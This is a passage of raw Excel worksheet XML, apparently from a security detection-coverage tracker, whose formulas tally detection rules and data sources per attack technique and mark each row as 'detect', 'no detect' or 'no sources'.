      <c r="M649" s="9" cm="1">
        <f t="array" ref="M649">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N649" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O649" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P649" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S649"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49" t="s">
        <v>520</v>
      </c>
      <c r="U649" t="s">
        <v>2939</v>
      </c>
      <c r="W649" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="650" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A650" t="s">
        <v>2940</v>
      </c>
      <c r="B650" t="s">
        <v>2940</v>
      </c>
      <c r="C650" t="s">
        <v>131</v>
      </c>
      <c r="D650" t="s">
        <v>8</v>
      </c>
      <c r="E650" t="s">
        <v>451</v>
      </c>
      <c r="F650" s="9">
        <f t="shared" si="10"/>
        <v>4</v>
      </c>
      <c r="G650" s="9" cm="1">
        <f t="array" ref="G650">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H650" s="9" cm="1">
        <f t="array" ref="H650">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I650" s="9" t="str" cm="1">
        <f t="array" ref="I650">IF(SUM(IF($C650=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C650=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J650" s="9" t="str" cm="1">
        <f t="array" ref="J650">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50" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M650" s="9" cm="1">
        <f t="array" ref="M650">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N650" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O650" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P650" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S650"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50" t="s">
        <v>368</v>
      </c>
      <c r="U650" t="s">
        <v>2941</v>
      </c>
      <c r="W650" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="651" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A651" t="s">
        <v>2942</v>
      </c>
      <c r="B651" t="s">
        <v>2942</v>
      </c>
      <c r="C651" t="s">
        <v>165</v>
      </c>
      <c r="D651" t="s">
        <v>4</v>
      </c>
      <c r="E651" t="s">
        <v>634</v>
      </c>
      <c r="F651" s="9">
        <f t="shared" si="10"/>
        <v>2</v>
      </c>
      <c r="G651" s="9" cm="1">
        <f t="array" ref="G651">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H651" s="9" cm="1">
        <f t="array" ref="H651">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I651" s="9" t="str" cm="1">
        <f t="array" ref="I651">IF(SUM(IF($C651=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C651=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J651" s="9" t="str" cm="1">
        <f t="array" ref="J651">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51" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M651" s="9" cm="1">
        <f t="array" ref="M651">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N651" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O651" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P651" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S651"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51" t="s">
        <v>425</v>
      </c>
      <c r="U651" t="s">
        <v>2943</v>
      </c>
      <c r="V651" t="s">
        <v>2944</v>
      </c>
      <c r="W651" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="652" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A652" t="s">
        <v>2945</v>
      </c>
      <c r="B652" t="s">
        <v>2945</v>
      </c>
      <c r="C652" t="s">
        <v>161</v>
      </c>
      <c r="D652" t="s">
        <v>8</v>
      </c>
      <c r="E652" t="s">
        <v>1009</v>
      </c>
      <c r="F652" s="9">
        <f t="shared" si="10"/>
        <v>3</v>
      </c>
      <c r="G652" s="9" cm="1">
        <f t="array" ref="G652">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H652" s="9" cm="1">
        <f t="array" ref="H652">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I652" s="9" t="str" cm="1">
        <f t="array" ref="I652">IF(SUM(IF($C652=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C652=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J652" s="9" t="str" cm="1">
        <f t="array" ref="J652">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52" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M652" s="9" cm="1">
        <f t="array" ref="M652">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N652" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O652" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P652" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S652"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52" t="s">
        <v>485</v>
      </c>
      <c r="U652" t="s">
        <v>2946</v>
      </c>
      <c r="W652" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="653" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A653" t="s">
        <v>2947</v>
      </c>
      <c r="B653" t="s">
        <v>2947</v>
      </c>
      <c r="C653" t="s">
        <v>171</v>
      </c>
      <c r="D653" t="s">
        <v>6</v>
      </c>
      <c r="E653" t="s">
        <v>549</v>
      </c>
      <c r="F653" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G653" s="9" cm="1">
        <f t="array" ref="G653">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H653" s="9" cm="1">
        <f t="array" ref="H653">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I653" s="9" t="str" cm="1">
        <f t="array" ref="I653">IF(SUM(IF($C653=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C653=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J653" s="9" t="str" cm="1">
        <f t="array" ref="J653">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53" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M653" s="9" cm="1">
        <f t="array" ref="M653">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N653" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O653" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P653" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S653"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53" t="s">
        <v>999</v>
      </c>
      <c r="U653" t="s">
        <v>2948</v>
      </c>
      <c r="W653" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="654" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A654" t="s">
        <v>2949</v>
      </c>
      <c r="B654" t="s">
        <v>2949</v>
      </c>
      <c r="C654" t="s">
        <v>114</v>
      </c>
      <c r="D654" t="s">
        <v>13</v>
      </c>
      <c r="E654" t="s">
        <v>549</v>
      </c>
      <c r="F654" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G654" s="9" cm="1">
        <f t="array" ref="G654">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H654" s="9" cm="1">
        <f t="array" ref="H654">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I654" s="9" t="str" cm="1">
        <f t="array" ref="I654">IF(SUM(IF($C654=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C654=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J654" s="9" t="str" cm="1">
        <f t="array" ref="J654">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54" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M654" s="9" cm="1">
        <f t="array" ref="M654">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N654" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O654" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P654" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S654"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54" t="s">
        <v>999</v>
      </c>
      <c r="U654" t="s">
        <v>2950</v>
      </c>
      <c r="W654" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="655" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A655" t="s">
        <v>2951</v>
      </c>
      <c r="B655" t="s">
        <v>2951</v>
      </c>
      <c r="C655" t="s">
        <v>16</v>
      </c>
      <c r="D655" t="s">
        <v>2952</v>
      </c>
      <c r="E655" t="s">
        <v>2953</v>
      </c>
      <c r="F655" s="9">
        <f t="shared" si="10"/>
        <v>3</v>
      </c>
      <c r="G655" s="9" cm="1">
        <f t="array" ref="G655">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H655" s="9" cm="1">
        <f t="array" ref="H655">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I655" s="9" t="str" cm="1">
        <f t="array" ref="I655">IF(SUM(IF($C655=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C655=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J655" s="9" t="str" cm="1">
        <f t="array" ref="J655">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55" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M655" s="9" cm="1">
        <f t="array" ref="M655">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N655" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O655" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P655" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S655"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55" t="s">
        <v>368</v>
      </c>
      <c r="U655" t="s">
        <v>2954</v>
      </c>
      <c r="W655" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="656" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A656" t="s">
        <v>2955</v>
      </c>
      <c r="B656" t="s">
        <v>2955</v>
      </c>
      <c r="C656" t="s">
        <v>122</v>
      </c>
      <c r="D656" t="s">
        <v>11</v>
      </c>
      <c r="E656" t="s">
        <v>2956</v>
      </c>
      <c r="F656" s="9">
        <f t="shared" si="10"/>
        <v>4</v>
      </c>
      <c r="G656" s="9" cm="1">
        <f t="array" ref="G656">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H656" s="9" cm="1">
        <f t="array" ref="H656">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I656" s="9" t="str" cm="1">
        <f t="array" ref="I656">IF(SUM(IF($C656=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C656=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J656" s="9" t="str" cm="1">
        <f t="array" ref="J656">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56" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M656" s="9" cm="1">
        <f t="array" ref="M656">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N656" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O656" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P656" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S656"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56" t="s">
        <v>425</v>
      </c>
      <c r="U656" t="s">
        <v>2957</v>
      </c>
      <c r="W656" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="657" spans="1:23" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A657" t="s">
        <v>2958</v>
      </c>
      <c r="B657" t="s">
        <v>2958</v>
      </c>
      <c r="C657" t="s">
        <v>189</v>
      </c>
      <c r="D657" t="s">
        <v>6</v>
      </c>
      <c r="E657" t="s">
        <v>2505</v>
      </c>
      <c r="F657" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G657" s="9" cm="1">
        <f t="array" ref="G657">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H657" s="9" cm="1">
        <f t="array" ref="H657">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I657" s="9" t="str" cm="1">
        <f t="array" ref="I657">IF(SUM(IF($C657=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C657=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J657" s="9" t="str" cm="1">
        <f t="array" ref="J657">IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]), Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules for Technique],0))-IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0),"")</f>
        <v/>
      </c>
      <c r="K657" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M657" s="9" cm="1">
        <f t="array" ref="M657">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N657" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O657" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P657" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S657" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;0,"expected detection rules negative!",IF(Techniques[[#This Row],[Detection Rules]]&gt;Techniques[[#This Row],[Expected Detection Rules]],"more detection rules than expected!",IF(AND(IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]]&gt;0,FALSE),IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE)),IF(Techniques[[#This Row],[Detection Rules for Technique]] &gt; IF(ISNUMBER(Techniques[[#This Row],[Detection Rules Modifier]]),Techniques[[#This Row],[Detection Rules Modifier]],0), "modifier should be increased for the technique", ""),"")))</f>
        <v/>
      </c>
      <c r="T657" t="s">
        <v>520</v>
      </c>
      <c r="U657" t="s">
        <v>2959</v>
      </c>
      <c r="W657" t="b">
        <v>0</v>
      </c>
    </row>
  </sheetData>
  <phoneticPr fontId="6" type="noConversion"/>
  <conditionalFormatting sqref="A2:P658">
    <cfRule type="expression" dxfId="4" priority="1" stopIfTrue="1">
      <formula>COUNTIF($P2,"disabled")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="3" priority="2" stopIfTrue="1">
      <formula>COUNTIF($P2,"detect")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="2" priority="3" stopIfTrue="1">
      <formula>COUNTIF($P2,"no detect")</formula>
    </cfRule>
    <cfRule type="expression" dxfId="1" priority="4" stopIfTrue="1">
      <formula>COUNTIF($P2,"inconsistent")</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46"/>
  <sheetViews>
    <sheetView topLeftCell="A75" workbookViewId="0">
      <selection activeCell="C94" sqref="C94"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="46.109375" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="7.109375" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="13.109375" style="9" bestFit="1" customWidth="1"/>
    <col min="4" max="4" width="21.44140625" customWidth="1"/>
    <col min="5" max="5" width="31.33203125" bestFit="1" customWidth="1"/>
    <col min="6" max="6" width="57" customWidth="1"/>
    <col min="7" max="7" width="14.6640625" customWidth="1"/>
    <col min="8" max="8" width="104.109375" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A1" s="10" t="s">
        <v>2960</v>
      </c>
      <c r="B1" s="11" t="s">
        <v>343</v>
      </c>
      <c r="C1" s="13" t="s">
        <v>2961</v>
      </c>
      <c r="D1" s="33" t="s">
        <v>2962</v>
      </c>
      <c r="E1" s="11" t="s">
        <v>2963</v>
      </c>
      <c r="F1" s="12" t="s">
        <v>361</v>
      </c>
      <c r="G1" s="32" t="s">
        <v>2964</v>
      </c>
      <c r="H1" s="11" t="s">
        <v>362</v>
      </c>
    </row>
    <row r="2" spans="1:8" x14ac:dyDescent="0.3">
      <c r="A2" t="s">
        <v>2965</v>
      </c>
      <c r="B2" t="s">
        <v>2966</v>
      </c>
      <c r="E2" t="s">
        <v>2967</v>
      </c>
      <c r="F2" t="s">
        <v>1084</v>
      </c>
